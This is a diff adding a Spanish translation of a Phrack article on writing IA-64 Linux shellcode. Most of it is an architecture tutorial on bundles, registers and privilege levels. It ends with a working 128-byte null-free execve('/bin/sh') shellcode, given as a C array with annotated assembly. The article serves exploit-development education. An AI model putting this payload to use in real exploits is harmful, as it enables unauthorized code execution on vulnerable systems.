@@ -1,0 +1,605 @@
+                             ==Phrack Inc.==
+
+             Volumen 0x0b, Numero 0x39, Archivo #0x05 de 0x12
+
+|=----------------=[ ESCRIBIENDO SHELLCODE PARA IA-64 ]=-----------------=|
+|=------=[ o: 'como convertir diamantes en mermelada de frijoles' ]------=|
+|=--------------------=[ papasutra of haquebright ]=---------------------=|
+
+
+- Intro
+- Gran Imagen
+- Arquitectura
+  - EPIC
+  - Instrucciones
+  - Bundles
+  - Tipos de Instrucciones y Plantillas
+  - Registros
+  - Lista de Registros
+  - Motor de Registro de Pila
+  - Conflictos de Dependencia
+  - Alineamiento y Endianess
+  - Proteccion de Memoria
+  - Niveles de Privilegio
+- Programacion
+  - Lenguaje Assembler GCC IA-64
+  - Lista de Instrucciones Utiles
+  - Optimizacion
+  - Aspectos de programacion
+- Codigos de Ejemplo
+- Referencias
+- Saludos
+
+
+--> Intro
+
+Este texto resume las tecnicas que necesitas y las cosas que he
+aprendido acerca de escribir shellcode para la IA-64. Aunque la
+IA-64 es capaz de ejecutar codigo IA-32, este no es el tema de
+este texto. El codigo de Ejemplo es para Linux, pero la mayoria
+de este es aplicable a todos los sistemas operativos que corran
+en IA-64.
+
+
+--> Gran Imagen
+
+IA-64 es el sucesor a IA-32, formalmente llamado arquitectura
+i386, que es implementada en todos esos chips de PC como Pentium y
+Athlon y demases.
+Es desarrollado por Intel y HP desde 1994, y esta disponible en el chip
+Itanium. IA-64 se convertira probablemente en la principal arquitectura
+para las estaciones de trabajo Unix de HP y SGI, y para Microsoft
+Windows. Es una arquitectura de 64 bits, y es capaz de hacer enteros
+aritmeticos de 64 bits en hardware y almacenar 2^64 bytes de memoria.
+Una caracteristica muy interesante es la ejecucion paralela de codigo,
+para lo cual es usado un formato binario muy especial.
+Entonces seamos un poco mas especificos.
+
+
+--> EPIC
+
+En las arquitecturas convencionales, la ejecucion paralela de codigo
+se hace posible por el propio chip. Las instrucciones leidas son
+analizadas, reordenadas y agrupadas por el hardware en el tiempo de
+ejecucion, y por lo tanto solo las suposiciones mas conservadoras
+pueden ser hechas.
+Por EPIC se entiende 'explicit parallel instruction computing'
+('computo de instrucciones explicitas paralelas'). Trabaja agrupando
+el codigo en partes independientes al momento de compilar, eso es,
+el codigo assembler debe contener ya la informacion dependiente.
+
+
+--> Instrucciones
+
+El tama~o de la instruccion se fija en 41 bits. Cada instruccion
+es construida con cinco campos:
+
++-----------+-----------+-----------+-----------+-----------+
+| opcode    | operando 1| operando 2| operando 3| predicado |
++-----------+-----------+-----------+-----------+-----------+
+| 40 a 27   | 26 a 20   | 19 a 13   | 12 a 6    | 5 a 0     |
++-----------+-----------+-----------+-----------+-----------+
+
+El espacio opcode de 14 bits mas largo es usado para operaciones
+especiales. Por ejemplo, hay diferentes instrucciones rama para
+ramas que son tomadas con frecuencia y otras raramente tomadas.
+Esta informacion extra luego es usada en la unidad de prediccion de
+rama.
+
+Hay tres campos operandos utilizables para valores inmediatos o
+numeros de registros. Algunas instrucciones combinan los tres
+campos operandos en un solo campo de valor intermedio de 21 bits.
+Es posible tambien apendizar un slot completo de instrucciones
+de 41 bits a otro para formar un campo de valor inmediato de 64 bits.
+
+El ultimo campo referencia a un tan nombrado registro predicado por un
+numero de 6 bits. Cada registro Predicado contiene un bit solo para
+representar los valores booleanos 'true' y 'false'. Si el valor es
+'false' en el momento de ejecucion, la instruccion es descartada justo
+antes de que haga efecto. Nota que algunas instrucciones no pueden ser
+predicadas.
+
+Si una cierta operacion no necesita un cierto campo en el plano de
+arriba, es puesto a cero por el ensamblador. Yo trate de completar
+otros valores, y siguio funcionando. Pero este puede no ser el caso
+de cada instruccion y cada implementacion de la arquitectura IA-64.
+Entonces ten cuidado con esto...
+Nota tambien que hay algunas instrucciones de acceso directo como
+mov, la cual para real es solo una operacion de adicion con registro 0
+(constante 0) como el otro argumento.
+
+
+--> Bundles (Fajos)
+
+En el codigo compilado, las instrucciones son agrupadas en 'fajos'
+de a tres. En cada fajo esta incluido un campo de plantilla de cinco
+bits que especifica que unidades de hardware son necesitadas para la
+ejecucion. Entonces lo que se reduce es un fajo de 128 bits de longitud.
+Lindo, eh?
+
++-----------+----------+---------+----------+
+| instr 1   | instr 2  | instr 3 | plantilla|
+|-----------+----------+---------+----------|
+| 127 a 87  | 86 a 46  | 45 a 5  | 4 a 0    |
++-----------+----------+---------+----------+
+
+Las Plantillas son usadas para despachar las instrucciones a las
+diferentes unidades de hardware. Esto es totalmente sencillo, el
+despachador solo tiene que cambiar sobre la plantilla de bits.
+
+Las Plantillas pueden tambien encodear un tan nombrado 'stop' despues
+de los slots de intruccion.
+Los Stops son usados para romper la ejecucion de instrucciones
+paralelas, y los necesitaras para resolver las Dependencias de Flujo
+de Datos (lee abajo). Puedes poner un stop despues de cada fajo
+completo, pero si necesitas ahorrar espacio, es con frecuencia mejor
+parar despues de una instruccion en el medio de un fajo. 
+Esto no funciona para cada plantilla, por lo que necesitas chequear
+la siguiente tabla de plantilla para esto.
+
+Las regiones de codigo independiente entre los stops son llamadas
+grupos de instruccion. Se llevan a cabo haciendo uso de semanticas 
+paralelas, el Itanium por ejemplo es capaz de ejecutar dos fajos
+al mismo tiempo, si hay suficientes unidades de ejecucion para el set
+de instrucciones especificadas en las plantillas. En las siguientes
+implementaciones, de seguro, los nombres seran mayores.
+
+
+--> Tipos de Instrucciones y Plantillas
+
+Hay diferentes tipos de intrucciones, agrupadas por la unidad de
+hardware que necesitan. Solo ciertas combinaciones estan permitidas
+en un solo fajo.
+Los tipos de Intrucciones son A (Entero ALU), I (Entero No-ALU),
+M (Memoria), F (Punto Flotante), B (Branch (Rama)) y L+X (Extendidos).
+Los slots X pueden tambien contener break.i y nop.i para razones
+de compatibilidad.
+
+En la siguiente lista de plantillas, '|' es un stop:
+
+00 M I I
+01 M I I|
+02 M I|I     <- stop en-fajo
+03 M I|I|    <- stop en-fajo
+04 M L X
+05 M L X|
+06 reserved
+07 reserved
+08 M M I
+09 M M I|
+0a M|M I     <- stop en-fajo
+0b M|M I|    <- stop en-fajo
+0c M F I
+0d M F I|
+0e M M F
+0f M M F|
+10 M I B
+11 M I B|
+12 M B B
+13 M B B|
+14 reserved
+15 reserved
+16 B B B
+17 B B B|
+18 M M B
+19 M M B|
+1a reserved
+1b reserved
+1c M F B
+1d M F B|
+1e reserved
+1f reserved
+
+
+--> Registros
+
+Esta no es una lista comprensible, chequea [1] si necesitas una.
+
+IA-64 especifica 128 registros (enteros) generales (r0..r127).
+Hay 128 registros de puntos flotantes, tambien (f0..f127).
+
+Los Registros de Predicado (p0..p63) son usados para optimizar
+decisiones en tiempo de ejecucion. Por ejemplo, los resultados de 'if'
+pueden ser manejados sin ramas poniendo un registro de predicado al
+resultado del 'if', y usando ese predicado para el codigo condicional.
+Como fue resumido arriba, los registros de predicado son referenciados
+por un campo en toda instruccion. Si no es especificado un registro,
+p0 es llenado por el ensamblador. p0 es siempre 'true'.
+
+Los Registros de Rama (b0..b7) son usados para ramas indirectas y
+llamados. Las instrucciones Rama pueden ser manejadas solamente por los
+registros de rama. Cuando se llama a una funcion, la direccion de
+retorno es almacenada en b0 por convencion. Es guardado a registros
+locales por la funcion llamada si esta necesita llamar a otras funciones.
+
+Estan los registros especiales Loop Count (LC) y Epilogue Count (EC).
+Su uso es explicado en el capitulo de optimizacion.
+
+El Current Frame Maker (CFM) mantiene el estado de la rotacion del
+registro. No es accesible directamente. El Intruction Pointer (IP)
+contiene la direccion del fajo que esta siendo ejecutado.
+
+La User Mask (UM):
++-------+-------------------------------------------------------------+
+| flag  | proposito                                                   |
++-------+-------------------------------------------------------------+
+| UM.be | pone esto a 1 para acceso a datos big endian                |
+| UM.ac | si esto es 0, Unaligned Memory Faults son incrementados solo|
+|       | si la situacion no puede ser manejada por el procesador     |
++-------+-------------------------------------------------------------+
+La User Mask puede ser modificada para cualquier nivel de privilegio 
+(lee abajo).
+
+Algunos interesantes campos Processor Status Register (PSM):
++---------+-----------------------------------------------------------+
+| flag    | proposito                                                 |
++---------+-----------------------------------------------------------+
+| PSR.pk  | si esto es 0, las llaves de proteccion son desactivadas   |
+| PSR.dt  | si esto es 0, el almacenamiento fisico de direcciones es  |
+|         | usado para acceso a datos; derechos de acceso no son      |
+|         | chequeados.						      |
+| PSR.it  | si esto es 0, el almacenamiento fisico de direcciones es  |
+|         | usado para acceso a instrucciones; derechos de acceso     |
+|         | no son chequeados.				              |
+| PSR.rt  | si esto es 0, el registro de traduccion de pila es        |
+| PSR.cpl | desactivado. Este es el actual nivel de privilegio.       |
+|         | Lee su capitulo para detalles.                            |
++---------+-----------------------------------------------------------+
+Todos menos el ultimo de estos campos puede ser solamente modificado desde
+el nivel de privilegio 0 (lee abajo).
+
+
+--> Lista de Registros
+
++---------+---------------------------------------------+
+| symbol  | Convencion de Uso                           |
++---------+---------------------------------------------+
+| b0      | Registro de Llamada (Call Register)         |
+| b1-b5   | Debe ser preservado                         |
+| b6-b7   | Scratch                                     |
+| r0      | Constante Cero (Constant Zero)              |
+| r1      | Puntero de Data Gobal (Global Data Pointer) |
+| r2-r3   | Scratch                                     |
+| r4-r5   | Debe ser preservado                         |
+| r8-r11  | Procedimiento de Retorno de Valores         |
+| r12     | Stack Pointer                               |
+| r13     | (Reservado como) Thread Pointer             |
+| r14-r31 | Scratch                                     |
+| r32-rxx | Registros de Argumento (Argument Registers) |
+| f2-f5   | Preservado                                  |
+| f6-f7   | Scratch                                     |
+| f8-f15  | Argumento/Registros de Retorno              |
+| f16-f31 | Debe ser preservado                         |
++---------+---------------------------------------------+
+Adicionalmente, LC debe ser preservado.
+
+
+--> Motor de Registro de Pila
+
+IA-64 te provee con un registro de pila. hay un marco de registro,
+que consiste en los registros input (in), local (loc), y output (out).
+Para destinar un marco de pila, usa la instruccion 'alloc' (lee [1]).
+Cuando una funcion es llamada, el marco de la pila es cambiado,
+por lo cual los antiguos registros output se convierten en nuevos
+registros input. Nota que necesitas destinar un marco de pila incluso
+si solo quieres acceder a los registros input.
+
+A diferencia de como con SPARC, no hay instrucciones 'guardar' y
+'restaurar' necesitadas en este plano. Tambien, la (memory) stack
+no es usada para pasar argumentos a funciones.
+
+El Motor de Registro de Pila tambien te provee con una rotacion de 
+registro. Esto hace posible el modulo-scheduling (almacenamiento de
+modulos), lee el capitulo de optimizacion para esto. El 'alloc'
+descripto arriba especifica cuantos registros generales de rotacion,
+la region de rotacion siempre comienza en r32, y superpone los registros
+output y locales. Tambien rotan, los registros de predicado p16 a p63 
+y los registros de punto flotante f32 a f127.
+
+
+--> Conflictos de Dependencia
+
+Los conflictos de Dependencia son formalmente clasificados en tres
+categorias:
+
+- Conflictos de Control de Flujo
+
+Esto ocurre cuando se hacen suposiciones sobre si una rama es tomada
+o no. Por ejemplo, el codigo siguiente a una instruccion de rama debe
+ser descartado cuando es tomado. En IA-64, esto pasa automaticamente.
+Pero si el codigo es optimizado usando control de especulacion (lee [1])
+los conflictos de control de flujo deben ser resueltos manualmente.
+El soporte de hardware es provisto.
+
+- Conflictos de Memoria
+
+La razon para los conflictos de memoria es la alta latencia de accesos de
+memoria comparada con los accesos de registros. El acceso a memoria es
+por lo tanto causante del calar de la ejecucion. IA-64 introdujo
+especulacion de datos (lee [1]) para poder mover cargas para ser
+ejecutadas lo mas temprano posible en el codigo.
+
+- Conflictos de Flujo de Datos
+
+Esto ocurre cuando hay instrucciones que comparten registros o campos de
+memoria en un bloque notable para ejecucion paralela. Esto conlleva a
+comportamiento indefinido y debe ser prevenido por el coder (programador).
+Este es el tipo de conflicto que te molestara casi siempre, especialmente
+tratando de escribir codigo compacto!
+
+
+--> Alineamiento y Endianess
+
+Como en muchas otras arquitecturas, tienes que alinear tus datos y codigo.
+En IA-64, el codigo debe ser alineado en limites de 16 bytes, y guardado
+en orden de bytes little endian. Los campos de datos deberian estar
+alineados de acuerdo con su tama~o, de forma que un caracter de 8 bits 
+deberia ser alineado en limites de 1 byte. Hay una regla especial para
+numeros de punto flotante de 10 bytes (casi siempre los necesitarias),
+esto es que tienes que alinearlo en limites de 16 bytes. Los datos
+endianess son controlados por el bit UM.be en la mascara del usuario
+('be' significa activacion de big endian). En Linux IA-64, little endian
+es por defecto.
+
+
+--> Proteccion de Memoria
+
+La memoria es dividida en varias paginas virtuales. Hay un set de
+Protection Key Registers (PKR) que contienen todas las llaves requeridas
+para un proceso. El Sistema Operativo maneja el PKR. Antes de que el
+acceso a memoria sea permitido, la llave del respectivo campo de memoria
+(que es guardada en el Translation Lookaside Buffer) es comparada con
+todas las llaves PKR. Si no coincide ninguna, un Key Miss fault (Falta
+en Error de Llave) es levantada. Si hay una llave que coincide, es
+chequeada para derechos de lectura, escritura y ejecucion. Las capacidades
+de acceso son calculadas desde el campo de derechos de acceso a claves,
+el nivel de privilegio del codigo que se esta ejecutando (lee [1] para
+detalles). Si una operacion esta por ser llevada a cabo y no es
+cubierta por las capacidades calculadas, un Key Permission Fault
+(Falta en Permisos de Clave) es generado.
+
+
+--> Niveles de Privilegio
+
+Hay cuatro niveles de privilegio numerados del 0..3, con 0 comienza
+el mas privilegiado. Las instrucciones del sistema y registros pueden
+ser llamados solo desde el nivel 0. El current privilege level (CPL)
+(actual nivel de privilegio) es guardado en PSR.cpl. Las siguientes
+instrucciones cambian el CPL:
+
+- enter privileged code (entrada de codigo de privilegio) (epc)
+La instruccion epc pone a CPL al nivel de privilegio de la pagina
+conteniendo la instruccion epc, si es numericamente mayor que el CPL.
+La pagina debe ser ejecutada sola, y el CPL no debe ser numericamente
+menor que el anterior nivel de privilegio.
+
+- break
+'break' hace un Break Instruction Fault (Falta de Quiebre en Instruccion).
+Como cada falta de instruccion en IA-64, esto pone el CPL a 0. Este valor
+inmediato guardado en el quiebre de codificacion es la direcion del
+manejador.
+
+- branch return (retorno de rama)
+Esto pone al CPL al valor anterior.
+
+
+--> GCC IA-64 Lenguaje Assembler
+
+Como deberias haberte figurado hasta ahora, el lenguaje assembler no es
+normalmente usado para programar un chip como este. Las tecnicas de
+optimizacion son muy dificiles para un programador para exploitearlo
+('explotarlo') a mano (aunque tambien es posible por supuesto).
+Assembler siempre sera usado para llamar a algunos processor ops
+(operadores del procesador) que los lenguajes de programacion no
+soportan directamente, para programacion de algoritmos, y para shellcode
+por supuesto.
+
+La sintaxis basicamente funciona asi:
+(predicate_num) opcode_name operand_1 = operand_2, operand_3
+Ejemplo:
+(p1) fmul f1 = f2, f3
+
+Como fue mencionado en el capitulo de formato de instruccion, a veces
+no todos los campos operandos son usados, o combinados.
+Adicionalmente, hay algunas instrucciones que no pueden ser predicadas.
+
+Los stops son codificados apendizando ';;' a la ultima instruccion de
+un grupo de instruccion. Los nombres simbolicos son usados para
+referenciar procedimientos, como siempre.
+
+
+--> Lista de Instrucciones Utiles
+
+Aunque tendras que chequear [3] en cada caso, aqui hay unas muy pocas
+instrucciones que querras chequear primero:
+
++--------+------------------------------------------------------------+
+| nombre | descripcion                                                |
++--------+------------------------------------------------------------+
+| dep    | deposita un valor inmediato de 8 bits en una posicion      |
+|        | arbitraria en un registro                                  |
+| dep    | deposita una porcion de un registro dentro de otro         |
+| mov    | direcciona un registro al registro general                 |
+| mov    | valor inmediato max de 22 bits al registro general         |
+| movl   | valor inmediato max de 64 bits al registro general         |
+| adds   | add short ('agrega corto')                                 |
+| branch | forma indirecta, no-llamada                                |
++--------+------------------------------------------------------------+
+
+
+--> Optimizaciones
+
+Hay algunas tecnicas de optimizacion que se hacen posible en IA-64.
+No obstante ya que el tema de este texto no es como escribir codigo rapido,
+no estan explicadas aqui. Chequea [5] para mas informacion acerca de
+esto, especialmente mira en Modulo Scheduling. Te permite superponer
+multiples repeticiones de un loop, lo que conlleva a un codigo muy
+compacto.
+
+
+--> Aspectos de Programacion
+
+Stack (Pila): Como en IA-32, la pila crece hacia las direcciones 
+mas bajas de memoria. Solo las variables locales son guardadas en la
+pila.
+
+System Calls (Llamadas al Sistema): Aunque las instrucciones epc se
+entienden para ser usadas en lugar de, Linux en IA-64 usa Break
+Instruction Faults para hacer una system call. De acuerdo con [6],
+Linux cambiara a epc algun dia, pero eso no ha pasado todavia.
+La direccion de manejador usada para realizar una system call es
+0x100000. Como fue establecido arriba, break solo puede usar
+valores inmediatos como manejador de direcciones. Esto introduce
+la necesidad de construir la instruccion break en la shellcode.
+Esto es llevado a cabo en el codigo mas abajo.
+
+Setteando predicados: haz esto usando la instruccion compare (cmp).
+Los predicados pueden tambien venir practicos si necesitas
+llenar algun espacio con instruccion, y quieres cancelarlos
+para formar NOPs.
+
+Consiguiendo el hardware: Chequea [2] o [7] para experimentar con
+IA-64, si no tienes uno para ti mismo.
+
+
+--> Example Code
+
+<++> ia64-linux-execve.c !f4ed8837
+/*
+ * ia64-linux-execve.c
+ * 128 bytes.
+ *
+ *
+ * NOTAS:
+ *
+ * the system call execve necesita:
+ * - string de comando addr en r35
+ * - args addr en r36
+ * - env addr en r37
+ *
+ * como ia64 tiene instrucciones fixed-length (41 bits), hay unas pocas
+ * instrucciones que tienen bits sin usar en su encodeado.
+ * use eso en dos puntos donde no encontre equivalentes nul-free.
+ * estos estan marcados '+0x01', lee abajo.
+ *
+ * es posible guardar al menos una instruccion cargando bundle[1]
+ * como un numero (como bundle[0]), pero esa seria una solucion menos
+ * interesante.
+ *
+ */
+
+unsigned long shellcode[] = {
+
+  /* MLX
+   * alloc r34 = ar.pfs, 0, 3, 3, 0   // asignar vars para syscall
+   * movl r14 = 0x0168732f6e69622f    // aka "/bin/sh",0x01
+   * ;; */
+  0x2f6e458006191005,
+  0x631132f1c0016873,
+
+  /* MLX
+   * xor r37 = r37, r37               // NULL
+   * movl r17 = 0x48f017994897c001    // bundle[0]
+   * ;; */
+  0x9948a00f4a952805,
+  0x6602e0122048f017,
+
+  /* MII
+   * adds r15 = 0x1094, r37           // bundle[1] sin terminar
+   * or r22 = 0x08, r37               // parte 1 de bundle[1]
+   * dep r12 = r37, r12, 0, 8         // align stack ptr
+   * ;; */
+  0x416021214a507801,
+  0x4fdc625180405c94,
+
+  /* MII
+   * adds r35 = -40, r12              // mem addr 1 circulante, shellstr addr
+   * adds r36 = -32, r12              // mem addr 2 circulante, args[0] addr
+   * dep r15 = r22, r15, 56, 8        // patch bundle[1] (parte 1)
+   * ;; */
+  0x0240233f19611801,
+  0x41dc7961e0467e33,
+
+  /* MII
+   * st8 [r36] = r35, 16              // args[0] = shellstring addr
+   * adds r19 = -16, r12              // prepara branch addr: bundle[0] addr
+   * or r23 = 0x42, r37               // parte 2 de bundle[1]
+   * ;; */
+  0x81301598488c8001,
+  0x80b92c22e0467e33,
+
+  /* MII
+   * st8 [r36] = r17, 8               // guardar bundle[0]
+   * dep r14 = r37, r14, 56, 8        // arreglar shellstring
+   * dep r15 = r23, r15, 16, 8        // patch bundle[1] (parte 2)
+   * ;; */
+  0x28e0159848444001,
+  0x4bdc7971e020ee39,
+
+  /* MMI
+   * st8 [r35] = r14, 25              // guardar shellstring
+   * cmp.eq p2, p8 = r37, r37         // preparar predicado para branch final.
+   * mov b6 = r19                     // (+0x01) cofigurar reg de branch
+   * ;; */
+  0x282015984638c801,
+  0x07010930c0701095,
+
+  /* MIB
+   * st8 [r36] = r15, -16             // guardar bundle[1]
+   * adds r35 = -25, r35              // corregir string addr
+   * (p2) br.cond.spnt.few b6         // (+0x01) branch a constr. bundle
+   * ;; */
+  0x3a301799483f8011,
+  0x0180016001467e8f,
+};
+
+/*
+ * the constructed bundle
+ *
+ * MII
+ * st8 [r36] = r37, -8                // args[1] = NULL
+ * adds r15 = 1033, r37               // numero de syscall
+ * break.i 0x100000
+ * ;;
+ *
+ * encoding is:
+ * bundle[0] = 0x48f017994897c001
+ * bundle[1] = 0x0800000000421094
+ */
+<-->
+
+
+--> Referencias
+
+[1] HP IA-64 instruction set architecture guide
+    http://devresource.hp.com/devresource/Docs/Refs/IA64ISA/
+[2] HP IA-64 Linux Simulator and Native User Environment
+    http://www.software.hp.com/products/LIA64/
+[3] Intel IA-64 Manuals
+    http://developer.intel.com/design/ia-64/manuals/
+[4] Sverre Jarp: IA-64 tutorial
+    http://cern.ch/sverre/IA64_1.pdf
+[5] Sverre Jarp: IA-64 performance-oriented programming
+    http://sverre.home.cern.ch/sverre/IA-64_Programming.html
+[6] A presentation about the Linux port to IA-64
+    http://linuxia64.org/logos/IA64linuxkernel.PDF
+[7] Compaq Testdrive Program
+    http://www.testdrive.compaq.com
+    
+La lista de registros esta en su mayoria copiada de [4]
+
+
+--> Saludos
+
+palmers, skyper y scut del team teso
+honx y homek de dudelab
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+ Traducido por Active Matrix - ActiveMatrix@technologist.com
+ Para RareGaZz - http://raregazz.cjb.net
+ Argentina, 2002
+ El articulo aqui traducido, mantiene los derechos de autor.
+
+
